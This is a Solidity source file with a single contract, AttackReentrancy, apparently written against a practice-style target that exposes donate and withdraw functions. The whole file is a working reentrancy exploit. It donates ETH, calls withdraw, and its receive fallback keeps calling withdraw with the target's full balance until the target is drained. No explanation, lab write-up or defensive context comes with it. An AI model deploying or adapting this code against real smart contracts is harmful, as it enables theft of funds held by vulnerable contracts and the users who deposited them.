// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackReentrancy {
    address public target;

    constructor(address _target) {
        target = _target;
    }

    function attack() external payable {
        require(msg.value > 0, "Must send some ETH to start the attack.");
        // Donate to the target contract to set up the balance
        (bool success, ) = target.call{value: msg.value}(
            abi.encodeWithSignature("donate(address)", address(this))
        );
        require(success, "Initial donation failed");

        // Withdraw the donated amount to start reentrancy
        (success, ) = target.call(
            abi.encodeWithSignature("withdraw(uint256)", msg.value)
        );
        require(success, "Withdraw failed");
    }

    receive() external payable {
        if (address(target).balance > 0) {
            // Keep withdrawing until the target balance is zero
            (bool success, ) = target.call(
                abi.encodeWithSignature(
                    "withdraw(uint256)",
                    address(target).balance
                )
            );
            require(success, "Reentrant withdraw failed");
        }
    }
}
